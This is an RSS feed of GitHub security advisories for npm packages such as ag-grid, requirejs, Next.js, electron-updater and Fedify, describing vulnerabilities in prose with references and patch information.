<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-07-12T01:27:22.482Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[ag-grid-community] Prototype pollution in ag-grid-community via the _.mergeDeep function]]></title>
        <id>https://github.com/advisories/GHSA-876p-c77m-x2hc</id>
        <link href="https://github.com/advisories/GHSA-876p-c77m-x2hc"/>
        <updated>2024-07-11T21:31:40.000Z</updated>
        <content type="html"><![CDATA[<p>ag-grid-community v31.3.2 and ag-grid-enterprise v31.3.2 were discovered to contain a prototype pollution via the _.mergeDeep function. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38996">https://nvd.nist.gov/vuln/detail/CVE-2024-38996</a></li>
<li><a href="https://gist.github.com/mestrtee/18e8c27f3a6376e7cf082cfe1ca766fa">https://gist.github.com/mestrtee/18e8c27f3a6376e7cf082cfe1ca766fa</a></li>
<li><a href="https://gist.github.com/mestrtee/c1590660750744f25e86ba1bf240844b">https://gist.github.com/mestrtee/c1590660750744f25e86ba1bf240844b</a></li>
<li><a href="https://gist.github.com/mestrtee/f8037d492dab0d77bca719e05d31c08b">https://gist.github.com/mestrtee/f8037d492dab0d77bca719e05d31c08b</a></li>
<li><a href="https://github.com/ag-grid/ag-grid/pull/8290">https://github.com/ag-grid/ag-grid/pull/8290</a></li>
<li><a href="https://github.com/advisories/GHSA-876p-c77m-x2hc">https://github.com/advisories/GHSA-876p-c77m-x2hc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-876p-c77m-x2hc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-01T15:32:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ag-grid-enterprise] Prototype pollution in ag-grid-community via the _.mergeDeep function]]></title>
        <id>https://github.com/advisories/GHSA-876p-c77m-x2hc</id>
        <link href="https://github.com/advisories/GHSA-876p-c77m-x2hc"/>
        <updated>2024-07-11T21:31:40.000Z</updated>
        <content type="html"><![CDATA[<p>ag-grid-community v31.3.2 and ag-grid-enterprise v31.3.2 were discovered to contain a prototype pollution via the _.mergeDeep function. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38996">https://nvd.nist.gov/vuln/detail/CVE-2024-38996</a></li>
<li><a href="https://gist.github.com/mestrtee/18e8c27f3a6376e7cf082cfe1ca766fa">https://gist.github.com/mestrtee/18e8c27f3a6376e7cf082cfe1ca766fa</a></li>
<li><a href="https://gist.github.com/mestrtee/c1590660750744f25e86ba1bf240844b">https://gist.github.com/mestrtee/c1590660750744f25e86ba1bf240844b</a></li>
<li><a href="https://gist.github.com/mestrtee/f8037d492dab0d77bca719e05d31c08b">https://gist.github.com/mestrtee/f8037d492dab0d77bca719e05d31c08b</a></li>
<li><a href="https://github.com/ag-grid/ag-grid/pull/8290">https://github.com/ag-grid/ag-grid/pull/8290</a></li>
<li><a href="https://github.com/advisories/GHSA-876p-c77m-x2hc">https://github.com/advisories/GHSA-876p-c77m-x2hc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-876p-c77m-x2hc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-01T15:32:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@aofl/cli-lib] @aofl/cli-lib Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vg6v-jcg3-5mp7</id>
        <link href="https://github.com/advisories/GHSA-vg6v-jcg3-5mp7"/>
        <updated>2024-07-11T17:43:36.000Z</updated>
        <content type="html"><![CDATA[<p>aofl cli-lib v3.14.0 was discovered to contain a prototype pollution via the component defaultsDeep. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38987">https://nvd.nist.gov/vuln/detail/CVE-2024-38987</a></li>
<li><a href="https://github.com/AgeOfLearning/aofl/issues/35">https://github.com/AgeOfLearning/aofl/issues/35</a></li>
<li><a href="https://gist.github.com/mestrtee/29636943e6989e67f38251580cbcea73">https://gist.github.com/mestrtee/29636943e6989e67f38251580cbcea73</a></li>
<li><a href="https://github.com/advisories/GHSA-vg6v-jcg3-5mp7">https://github.com/advisories/GHSA-vg6v-jcg3-5mp7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vg6v-jcg3-5mp7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-01T15:32:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@cat5th/key-serializer] @cat5th/key-serializer Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-whpx-g542-7c7v</id>
        <link href="https://github.com/advisories/GHSA-whpx-g542-7c7v"/>
        <updated>2024-07-11T17:35:47.000Z</updated>
        <content type="html"><![CDATA[<p>harvey-woo cat5th/key-serializer v0.2.5 was discovered to contain a prototype pollution via the function "query". This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39018">https://nvd.nist.gov/vuln/detail/CVE-2024-39018</a></li>
<li><a href="https://gist.github.com/mestrtee/be75c60307b2292884cc03cebd361f3f">https://gist.github.com/mestrtee/be75c60307b2292884cc03cebd361f3f</a></li>
<li><a href="https://github.com/advisories/GHSA-whpx-g542-7c7v">https://github.com/advisories/GHSA-whpx-g542-7c7v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-whpx-g542-7c7v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-01T15:32:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[speaker] speaker vulnerable to Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-w5fc-gj3h-26rx</id>
        <link href="https://github.com/advisories/GHSA-w5fc-gj3h-26rx"/>
        <updated>2024-07-11T17:25:31.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package speaker are vulnerable to Denial of Service (DoS) when providing unexpected input types to the channels property of the Speaker object makes it possible to reach an assert macro. Exploiting this vulnerability can lead to a process crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21526">https://nvd.nist.gov/vuln/detail/CVE-2024-21526</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-SPEAKER-6370676">https://security.snyk.io/vuln/SNYK-JS-SPEAKER-6370676</a></li>
<li><a href="https://github.com/TooTallNate/node-speaker/blob/316afff5a393fce438cf7296011fcfc6e12aa9dc/src/binding.c#L48">https://github.com/TooTallNate/node-speaker/blob/316afff5a393fce438cf7296011fcfc6e12aa9dc/src/binding.c#L48</a></li>
<li><a href="https://github.com/advisories/GHSA-w5fc-gj3h-26rx">https://github.com/advisories/GHSA-w5fc-gj3h-26rx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w5fc-gj3h-26rx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-10T06:33:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-twain] node-twain vulnerable to Improper Check or Handling of Exceptional Conditions]]></title>
        <id>https://github.com/advisories/GHSA-wxr3-2hgv-qm8f</id>
        <link href="https://github.com/advisories/GHSA-wxr3-2hgv-qm8f"/>
        <updated>2024-07-10T21:29:31.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package node-twain are vulnerable to Improper Check or Handling of Exceptional Conditions due to the length of the source data not being checked. Creating a new twain.TwainSDK with a productName or productFamily, manufacturer, version.info property of length &gt;= 34 chars leads to a buffer overflow vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21525">https://nvd.nist.gov/vuln/detail/CVE-2024-21525</a></li>
<li><a href="https://gist.github.com/dellalibera/55b87634a6c360e5be22a715f0566c99">https://gist.github.com/dellalibera/55b87634a6c360e5be22a715f0566c99</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-NODETWAIN-6421153">https://security.snyk.io/vuln/SNYK-JS-NODETWAIN-6421153</a></li>
<li><a href="https://github.com/advisories/GHSA-wxr3-2hgv-qm8f">https://github.com/advisories/GHSA-wxr3-2hgv-qm8f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wxr3-2hgv-qm8f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-10T06:33:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[images] images vulnerable to Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-vjpv-x8p9-7p85</id>
        <link href="https://github.com/advisories/GHSA-vjpv-x8p9-7p85"/>
        <updated>2024-07-10T21:28:43.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package images are vulnerable to Denial of Service (DoS) due to providing unexpected input types to several different functions. This makes it possible to reach an assert macro, leading to a process crash.</p>
<p><strong>Note:</strong>
By providing some specific integer values (like 0) to the size function, it is possible to obtain a Segmentation fault error, leading to the process crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21523">https://nvd.nist.gov/vuln/detail/CVE-2024-21523</a></li>
<li><a href="https://gist.github.com/dellalibera/8b4ea6b4db84cba212e6e6e39a6933d1">https://gist.github.com/dellalibera/8b4ea6b4db84cba212e6e6e39a6933d1</a></li>
<li><a href="https://github.com/zhangyuanwei/node-images/blob/691d49f4e620b4eec9f1c47b1735841d9d8b55f6/src/Image.cc">https://github.com/zhangyuanwei/node-images/blob/691d49f4e620b4eec9f1c47b1735841d9d8b55f6/src/Image.cc</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-IMAGES-6421826">https://security.snyk.io/vuln/SNYK-JS-IMAGES-6421826</a></li>
<li><a href="https://github.com/advisories/GHSA-vjpv-x8p9-7p85">https://github.com/advisories/GHSA-vjpv-x8p9-7p85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjpv-x8p9-7p85</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-10T06:33:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-stringbuilder] node-stringbuilder vulnerable to Out-of-bounds Read]]></title>
        <id>https://github.com/advisories/GHSA-g533-xq5w-jmf3</id>
        <link href="https://github.com/advisories/GHSA-g533-xq5w-jmf3"/>
        <updated>2024-07-10T20:43:35.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package node-stringbuilder are vulnerable to Out-of-bounds Read due to incorrect memory length calculation, by calling ToBuffer, ToString, or CharAt on a StringBuilder object with a non-empty string value input. It's possible to return previously allocated memory, for example, by providing negative indexes, leading to an Information Disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21524">https://nvd.nist.gov/vuln/detail/CVE-2024-21524</a></li>
<li><a href="https://gist.github.com/dellalibera/0bb022811224f81d998fa61c3175ee67">https://gist.github.com/dellalibera/0bb022811224f81d998fa61c3175ee67</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-NODESTRINGBUILDER-6421617">https://security.snyk.io/vuln/SNYK-JS-NODESTRINGBUILDER-6421617</a></li>
<li><a href="https://github.com/magiclen/node-stringbuilder/blob/5c2797d3d6bf8cb6d10fe1e077609cef9a5a7de0/src/node-stringbuilder.c#L1281">https://github.com/magiclen/node-stringbuilder/blob/5c2797d3d6bf8cb6d10fe1e077609cef9a5a7de0/src/node-stringbuilder.c#L1281</a></li>
<li><a href="https://github.com/advisories/GHSA-g533-xq5w-jmf3">https://github.com/advisories/GHSA-g533-xq5w-jmf3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g533-xq5w-jmf3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-10T06:33:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[audify] audify vulnerable to Improper Validation of Array Index]]></title>
        <id>https://github.com/advisories/GHSA-7vhm-fmph-7wxw</id>
        <link href="https://github.com/advisories/GHSA-7vhm-fmph-7wxw"/>
        <updated>2024-07-10T20:43:22.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package audify are vulnerable to Improper Validation of Array Index when frameSize is provided to the new OpusDecoder().decode or new OpusDecoder().decodeFloat functions it is not checked for negative values. This can lead to a process crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21522">https://nvd.nist.gov/vuln/detail/CVE-2024-21522</a></li>
<li><a href="https://gist.github.com/dellalibera/6bb866ae5d1cc2adaabe27bbd6d2d21e">https://gist.github.com/dellalibera/6bb866ae5d1cc2adaabe27bbd6d2d21e</a></li>
<li><a href="https://github.com/almoghamdani/audify/blob/94b2fe79dc528fda2c7d59c7a0fd0e9de07dc3dc/src/opus_decoder.cpp%23L79">https://github.com/almoghamdani/audify/blob/94b2fe79dc528fda2c7d59c7a0fd0e9de07dc3dc/src/opus_decoder.cpp%23L79</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-AUDIFY-6370700">https://security.snyk.io/vuln/SNYK-JS-AUDIFY-6370700</a></li>
<li><a href="https://github.com/almoghamdani/audify/blob/94b2fe79dc528fda2c7d59c7a0fd0e9de07dc3dc/src/opus_decoder.cpp#L53">https://github.com/almoghamdani/audify/blob/94b2fe79dc528fda2c7d59c7a0fd0e9de07dc3dc/src/opus_decoder.cpp#L53</a></li>
<li><a href="https://github.com/advisories/GHSA-7vhm-fmph-7wxw">https://github.com/advisories/GHSA-7vhm-fmph-7wxw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7vhm-fmph-7wxw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-10T06:33:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@discordjs/opus] @discordjs/opus vulnerable to Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-43wq-xrcm-3vgr</id>
        <link href="https://github.com/advisories/GHSA-43wq-xrcm-3vgr"/>
        <updated>2024-07-11T19:10:44.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package @discordjs/opus are vulnerable to Denial of Service (DoS) due to providing an input object with a property toString to several different functions. Exploiting this vulnerability could lead to a process crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21521">https://nvd.nist.gov/vuln/detail/CVE-2024-21521</a></li>
<li><a href="https://gist.github.com/dellalibera/98c48fd74bb240adbd7841a5c02aba9e">https://gist.github.com/dellalibera/98c48fd74bb240adbd7841a5c02aba9e</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-DISCORDJSOPUS-6370643">https://security.snyk.io/vuln/SNYK-JS-DISCORDJSOPUS-6370643</a></li>
<li><a href="https://github.com/discordjs/opus/blob/814e500c2785c5207ace19650192629beba2728b/src/node-opus.cc#L47">https://github.com/discordjs/opus/blob/814e500c2785c5207ace19650192629beba2728b/src/node-opus.cc#L47</a></li>
<li><a href="https://github.com/advisories/GHSA-43wq-xrcm-3vgr">https://github.com/advisories/GHSA-43wq-xrcm-3vgr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-43wq-xrcm-3vgr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-10T06:33:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[requirejs] jrburke requirejs vulnerable to prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-x3m3-4wpv-5vgc</id>
        <link href="https://github.com/advisories/GHSA-x3m3-4wpv-5vgc"/>
        <updated>2024-07-10T16:50:19.000Z</updated>
        <content type="html"><![CDATA[<p>jrburke requirejs v2.3.6 was discovered to contain a prototype pollution via the function <code>s.contexts._.configure</code>. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38999">https://nvd.nist.gov/vuln/detail/CVE-2024-38999</a></li>
<li><a href="https://gist.github.com/mestrtee/9acae342285bd2998fa09ebcb1e6d30a">https://gist.github.com/mestrtee/9acae342285bd2998fa09ebcb1e6d30a</a></li>
<li><a href="https://github.com/advisories/GHSA-x3m3-4wpv-5vgc">https://github.com/advisories/GHSA-x3m3-4wpv-5vgc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x3m3-4wpv-5vgc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-01T15:32:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fast-loops] robinweser fast-loops vulnerable to prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-3q56-9cc2-46j4</id>
        <link href="https://github.com/advisories/GHSA-3q56-9cc2-46j4"/>
        <updated>2024-07-10T16:03:49.000Z</updated>
        <content type="html"><![CDATA[<p>robinweser fast-loops v1.1.3 was discovered to contain a prototype pollution via the function <code>objectMergeDeep</code>. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39008">https://nvd.nist.gov/vuln/detail/CVE-2024-39008</a></li>
<li><a href="https://gist.github.com/mestrtee/f09a507c8d59fbbb7fd40880cd9b87ed">https://gist.github.com/mestrtee/f09a507c8d59fbbb7fd40880cd9b87ed</a></li>
<li><a href="https://github.com/robinweser/fast-loops/commit/6743acf64af832b7a0bbecf95cb4c7d95a3b766e">https://github.com/robinweser/fast-loops/commit/6743acf64af832b7a0bbecf95cb4c7d95a3b766e</a></li>
<li><a href="https://github.com/advisories/GHSA-3q56-9cc2-46j4">https://github.com/advisories/GHSA-3q56-9cc2-46j4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3q56-9cc2-46j4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-01T15:32:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Denial of Service (DoS) condition]]></title>
        <id>https://github.com/advisories/GHSA-fq54-2j52-jc42</id>
        <link href="https://github.com/advisories/GHSA-fq54-2j52-jc42"/>
        <updated>2024-07-10T21:32:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Denial of Service (DoS) condition was identified in Next.js. Exploitation of the bug can trigger a crash, affecting the availability of the server.</p>
<p><strong>This vulnerability can affect all Next.js deployments on the affected versions.</strong></p>
<h3 id="patches">Patches</h3>
<p>This vulnerability was resolved in Next.js 13.5 and later. We recommend that users upgrade to a safe version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability.</p>
<h4 id="credit">Credit</h4>
<p>We'd like to thank Thai Vu of <a href="http://flyseccorp.com/">flyseccorp.com</a> for responsible disclosure of this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-fq54-2j52-jc42">https://github.com/vercel/next.js/security/advisories/GHSA-fq54-2j52-jc42</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39693">https://nvd.nist.gov/vuln/detail/CVE-2024-39693</a></li>
<li><a href="https://github.com/advisories/GHSA-fq54-2j52-jc42">https://github.com/advisories/GHSA-fq54-2j52-jc42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fq54-2j52-jc42</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-10T16:03:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[electron-updater] electron-updater Code Signing Bypass on Windows]]></title>
        <id>https://github.com/advisories/GHSA-9jxc-qjr9-vjxq</id>
        <link href="https://github.com/advisories/GHSA-9jxc-qjr9-vjxq"/>
        <updated>2024-07-09T21:41:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="observations">Observations</h3>
<p>The file <code>packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts</code> implements the signature validation routine for Electron applications on Windows. It executes the following command in a new shell (<code>process.env.ComSpec</code> on Windows, usually <code>C:\Windows\System32\cmd.exe</code>):</p>
<p><a href="https://github.com/electron-userland/electron-builder/blob/140e2f0eb0df79c2a46e35024e96d0563355fc89/packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts#L35-L41">https://github.com/electron-userland/electron-builder/blob/140e2f0eb0df79c2a46e35024e96d0563355fc89/packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts#L35-L41</a></p>
<p>Because of the surrounding shell, a first pass by <code>cmd.exe</code> expands any environment variable found in command-line above.</p>
<h3 id="exploitation">Exploitation</h3>
<p>This creates a situation where <code>verifySignature()</code> can be tricked into validating the certificate of a different file than the one that was just downloaded. If the step is successful, the malicious update will be executed even if its signature is invalid. </p>
<h3 id="impact">Impact</h3>
<p>This attack assumes a compromised update manifest (server compromise, Man-in-the-Middle attack if fetched over HTTP, Cross-Site Scripting to point the application to a malicious updater server, etc.).</p>
<h3 id="patch">Patch</h3>
<p>This vulnerability was patched in #8295, by comparing the path in the output of <code>Get-AuthenticodeSignature</code> with the intended one. The patch is available starting from 6.3.0-alpha.6.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/electron-userland/electron-builder/security/advisories/GHSA-9jxc-qjr9-vjxq">https://github.com/electron-userland/electron-builder/security/advisories/GHSA-9jxc-qjr9-vjxq</a></li>
<li><a href="https://github.com/electron-userland/electron-builder/pull/8295">https://github.com/electron-userland/electron-builder/pull/8295</a></li>
<li><a href="https://github.com/electron-userland/electron-builder/commit/ac2e6a25aa491c1ef5167a552c19fc2085cd427f">https://github.com/electron-userland/electron-builder/commit/ac2e6a25aa491c1ef5167a552c19fc2085cd427f</a></li>
<li><a href="https://github.com/electron-userland/electron-builder/blob/140e2f0eb0df79c2a46e35024e96d0563355fc89/packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts#L35-L41">https://github.com/electron-userland/electron-builder/blob/140e2f0eb0df79c2a46e35024e96d0563355fc89/packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts#L35-L41</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39698">https://nvd.nist.gov/vuln/detail/CVE-2024-39698</a></li>
<li><a href="https://github.com/advisories/GHSA-9jxc-qjr9-vjxq">https://github.com/advisories/GHSA-9jxc-qjr9-vjxq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jxc-qjr9-vjxq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-09T17:48:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Server Side Request Forgery (SSRF) attack in Fedify]]></title>
        <id>https://github.com/advisories/GHSA-p9cg-vqcc-grcx</id>
        <link href="https://github.com/advisories/GHSA-p9cg-vqcc-grcx"/>
        <updated>2024-07-09T13:58:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>At present, when Fedify needs to retrieve an object or activity from a remote activitypub server, it makes a HTTP request to the <code>@id</code> or other resources present within the activity it has received from the web. This activity could reference an <code>@id</code> that points to an internal IP address, allowing an attacker to send request to resources internal to the fedify server's network.</p>
<p>This applies to not just resolution of documents containing activities or objects, but also to media URLs as well.</p>
<p>Specifically this is a <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">Server Side Request Forgery attack</a>. You can learn more about SSRF attacks via <a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918</a></p>
<h3 id="details">Details</h3>
<p>When Fedify makes a request at runtime via the DocLoader [1] [2], the <code>fetch</code> API does not first check the URI's to assert that it resolve to a public IP address. Additionally, any downstream software of Fedify that may fetch data from URIs contained within Activities or Objects maybe be at risk of requesting non-public resources, and storing those, exposing non-public information to the public.</p>
<p>Additionally, in many cases the URIs are not asserted to be either strictly HTTPS or HTTP protocols, which could lead to further attacks, and there is no check that the URI contains a <code>hostname</code> part. Whilst the <a href="https://fetch.spec.whatwg.org/"><code>fetch()</code> specification</a> may provide some safety here, along with underlying fetch implementations, there is still potential for attacks through using <code>data:</code> URIs, or just attacking some other protocol entirely, e.g., FTP or CalDav.</p>
<p>[1] <a href="https://github.com/dahlia/fedify/blob/main/runtime/docloader.ts#L141">https://github.com/dahlia/fedify/blob/main/runtime/docloader.ts#L141</a>
[2] <a href="https://github.com/dahlia/fedify/blob/main/runtime/docloader.ts#L175">https://github.com/dahlia/fedify/blob/main/runtime/docloader.ts#L175</a></p>
<h4 id="deno-specific-attack-vectors">Deno-specific Attack Vectors</h4>
<p>In Deno specifically, the <code>fetch()</code> API allows <a href="https://docs.deno.com/deploy/api/runtime-fetch/">accessing local filesystem</a>, I'm not sure how Deno's <a href="https://docs.deno.com/runtime/manual/runtime/permission_apis/">Permissions model</a> may prevent attacks utilising <code>file:</code> URIs.</p>
<blockquote>
<p>Fetch also supports fetching from file URLs to retrieve static files. For more info on static files, see the <a href="https://docs.deno.com/deploy/api/runtime-fs">filesystem API documentation</a>.</p>
</blockquote>
<h4 id="activitypub-security-considerations">ActivityPub Security Considerations</h4>
<p>This is also noted in the ActivityPub spec in <a href="https://www.w3.org/TR/activitypub/#security-localhost">Section B.3 Security Considerations</a>, however, there it is more limited in scope.</p>
<h4 id="other-implementations">Other Implementations</h4>
<p>It may be acceptable to allow a server operator to allow access to given non-public IP addresses, for instance <a href="https://github.com/mastodon/mastodon/blob/092bb8a27af9ee87ff9ebabaf354477470ea3a94/app/lib/request.rb#L330">in Mastodon</a> they allow requests to non-public IP addresses, i.e., localhost in development and those in the <code>ALLOWED_PRIVATE_ADDRESSES</code> environment variable.</p>
<h3 id="poc">PoC</h3>
<p>I'm not sure a PoC is necessary given this is a reasonably well known vulnerability vector.</p>
<h3 id="impact">Impact</h3>
<p>This impacts server operates, as resources that are internal to their network may find themselves being improperly accessed or potentially even attacked or exposed to the public.</p>
<h3 id="notes-for-resolution">Notes for resolution:</h3>
<p>When implementing public IP address validation, be careful of <a href="https://cwe.mitre.org/data/definitions/1389.html">CWE-1389</a> and <a href="https://cwe.mitre.org/data/definitions/1286.html">CWE-1286</a> both of which <a href="https://github.com/advisories/GHSA-78xj-cgh5-2h22">recently</a> caused a CVE to be filed against the popular node.js <code>ip</code> package, although this package was not originally intended for security purposes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dahlia/fedify/security/advisories/GHSA-p9cg-vqcc-grcx">https://github.com/dahlia/fedify/security/advisories/GHSA-p9cg-vqcc-grcx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39687">https://nvd.nist.gov/vuln/detail/CVE-2024-39687</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/30f9cf4a175704a04c874f3ea88414c5f1e00b28">https://github.com/dahlia/fedify/commit/30f9cf4a175704a04c874f3ea88414c5f1e00b28</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/c641e976089dd913f649889c1bfb016df04e86ba">https://github.com/dahlia/fedify/commit/c641e976089dd913f649889c1bfb016df04e86ba</a></li>
<li><a href="https://github.com/dahlia/fedify/releases/tag/0.11.1">https://github.com/dahlia/fedify/releases/tag/0.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-p9cg-vqcc-grcx">https://github.com/advisories/GHSA-p9cg-vqcc-grcx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p9cg-vqcc-grcx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-05T20:07:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Server Side Request Forgery (SSRF) attack in Fedify]]></title>
